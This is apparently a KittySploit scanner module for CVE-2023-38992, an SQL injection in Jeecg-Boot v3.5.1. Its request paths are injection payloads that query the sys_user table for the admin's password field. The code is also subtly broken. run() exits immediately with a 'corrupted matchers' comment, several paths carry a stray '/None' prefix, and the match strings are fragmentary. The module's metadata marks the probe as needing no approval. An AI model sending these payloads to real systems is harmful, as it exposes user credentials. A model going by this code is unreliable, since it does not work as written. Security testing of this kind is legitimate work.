#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SQL injection vulnerability via the title parameter at /sys/dict/loadTreeData in jeecg-boot v3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jeecg-Boot v3.5.1 - SQL Injection Detection',
        'description': 'SQL injection vulnerability via the title parameter at /sys/dict/loadTreeData in jeecg-boot v3.5.1.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'jeecg', 'jeecg-boot', 'sqli', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/jeecgboot/jeecg-boot/issues/5173',
            'https://my.oschina.net/jeecg/blog/10107636',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-38992',
        ],
        'cve': 'CVE-2023-38992',
    }

    def run(self):
        return False  # disabled: corrupted matchers
        for path in ('/Nonesys/dict/loadTreeData?tableName=sys_user&text=password%20text,id&code=password&hasChildField=&converIsLeafVal=1&condition=&pid=admin&pidField=username', '/jeecg-boot/sys/dict/loadTreeData?tableName=sys_user&text=password%20text,id&code=password&hasChildField=&converIsLeafVal=1&condition=&pid=admin&pidField=username', '/Nonesys/dict/loadTreeData?tableName=sys_user+t&text=password,id&code=password&hasChildField=&converIsLeafVal=1&condition=&pid=admin&pidField=username', '/jeecg-boot/sys/dict/loadTreeData?tableName=sys_user+t&text=password,id&code=password&hasChildField=&converIsLeafVal=1&condition=&pid=admin&pidField=username'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('parentId\\', ':', '{\\', ':true')
            header_any = ('application/json',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='critical',
                    reason="Jeecg-Boot v3.5.1 - SQL Injection detected",
                    path=path,
                )
                return True
        return False

